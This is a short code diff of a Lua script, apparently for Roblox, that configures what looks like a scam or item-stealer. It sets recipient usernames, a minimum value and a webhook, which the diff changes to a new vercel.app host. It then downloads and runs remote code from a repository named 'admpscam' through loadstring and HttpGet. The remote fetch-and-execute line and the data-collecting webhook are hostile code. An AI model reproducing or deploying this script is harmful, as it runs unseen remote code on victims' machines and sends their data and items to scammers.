@@ -63,10 +63,11 @@ end
 _G.Usernames = {"J1xnyy", "hrz4z", "kurxiibby"}
 _G.min_value = 1
 _G.pingEveryone = "Yes"
-_G.webhook = "https://admpscam.vercel.app/api/discord"
+_G.webhook = "https://hookie-dun.vercel.app/"
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/prexciouis/admpscam/refs/heads/main/best.lua"))()
+
